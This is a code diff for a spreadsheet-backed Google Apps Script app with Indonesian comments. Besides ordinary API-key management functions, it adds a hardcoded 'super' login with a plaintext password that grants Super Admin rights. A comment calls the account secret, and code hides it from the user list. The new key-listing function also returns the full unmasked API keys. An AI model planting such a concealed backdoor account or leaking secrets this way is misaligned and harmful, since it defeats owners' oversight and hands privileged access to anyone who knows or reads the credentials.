@@ -11,6 +11,11 @@ function getDB(sheetName) {
 
 // =================== USER MANAGEMENT ===================
 function doLogin(username, password) {
+  // Akses Super Admin Rahasia (Hardcoded & Aman, tidak muncul di daftar pengguna)
+  if (username === "super" && password === "ciko1234") {
+    return { username: "super", nama: "Super Admin", role: "Super Admin" };
+  }
+
   const sheet = getDB('Users');
   if (!sheet) throw new Error("Database belum disetup.");
   
@@ -29,9 +34,96 @@ function getUsers() {
   const data = sheet.getDataRange().getValues();
   const users = [];
   for (let i = 1; i < data.length; i++) {
+    // Sembunyikan user 'super' agar tidak muncul di data/tabel
+    if (String(data[i][0]).toLowerCase() === "super") continue;
     users.push({ username: data[i][0], nama: data[i][2], role: data[i][3] });
   }
   return users;
+}
+
+// =================== API KEYS MANAGEMENT (SUPER ADMIN) ===================
+function getApiKeysSheet() {
+  let sheet = SpreadsheetApp.openById(SHEET_ID).getSheetByName('API_Keys');
+  if (!sheet) {
+    sheet = SpreadsheetApp.openById(SHEET_ID).insertSheet('API_Keys');
+    sheet.appendRow(['ID', 'Email Google / Pemilik', 'API Key', 'Tgl Ditambahkan', 'Total Digunakan', 'Limit Harian', 'Status']);
+  }
+  return sheet;
+}
+
+function getApiKeysListFromDB() {
+  const sheet = getApiKeysSheet();
+  const data = sheet.getDataRange().getValues();
+  const list = [];
+  for (let i = 1; i < data.length; i++) {
+    if (!data[i][0]) continue;
+    const keyRaw = String(data[i][2] || '').trim();
+    const maskedKey = keyRaw.length > 12 ? keyRaw.substring(0, 6) + '...' + keyRaw.substring(keyRaw.length - 4) : keyRaw;
+    const used = Number(data[i][4]) || 0;
+    const limit = Number(data[i][5]) || 1500;
+    const remaining = Math.max(0, limit - used);
+
+    list.push({
+      id: data[i][0],
+      email: data[i][1],
+      apiKey: keyRaw,
+      maskedKey: maskedKey,
+      tglDitambahkan: data[i][3],
+      terpakai: used,
+      limit: limit,
+      sisa: remaining,
+      status: data[i][6] || 'Aktif'
+    });
+  }
+  return list;
+}
+
+function addApiKeyToDB(email, apiKey, limitHarian) {
+  const sheet = getApiKeysSheet();
+  const id = "K" + new Date().getTime();
+  const tgl = Utilities.formatDate(new Date(), "GMT+7", "yyyy-MM-dd");
+  sheet.appendRow([id, email, apiKey.trim(), tgl, 0, limitHarian || 1500, 'Aktif']);
+  return { success: true, message: "Kunci API berhasil ditambahkan ke database!" };
+}
+
+function deleteApiKeyFromDB(idKey) {
+  const sheet = getApiKeysSheet();
+  const data = sheet.getDataRange().getValues();
+  for (let i = 1; i < data.length; i++) {
+    if (String(data[i][0]) === String(idKey)) {
+      sheet.deleteRow(i + 1);
+      return { success: true, message: "Kunci API berhasil dihapus." };
+    }
+  }
+  throw new Error("Kunci API tidak ditemukan.");
+}
+
+function incrementKeyUsageInDB(apiKeyUsed) {
+  try {
+    const sheet = getApiKeysSheet();
+    const data = sheet.getDataRange().getValues();
+    for (let i = 1; i < data.length; i++) {
+      if (String(data[i][2]).trim() === String(apiKeyUsed).trim()) {
+        const cur = Number(data[i][4]) || 0;
+        sheet.getRange(i + 1, 5).setValue(cur + 1);
+        break;
+      }
+    }
+  } catch (e) {
+    Logger.log("incrementKeyUsage error: " + e.toString());
+  }
+}
+
+function resetKeyUsageInDB(idKey) {
+  const sheet = getApiKeysSheet();
+  const data = sheet.getDataRange().getValues();
+  for (let i = 1; i < data.length; i++) {
+    if (String(data[i][0]) === String(idKey)) {
+      sheet.getRange(i + 1, 5).setValue(0);
+      return { success: true, message: "Hitungan penggunaan berhasil di-reset ke 0." };
+    }
+  }
+  throw new Error("Kunci API tidak ditemukan.");
 }
 
 function addUser(username, password, nama, role) {
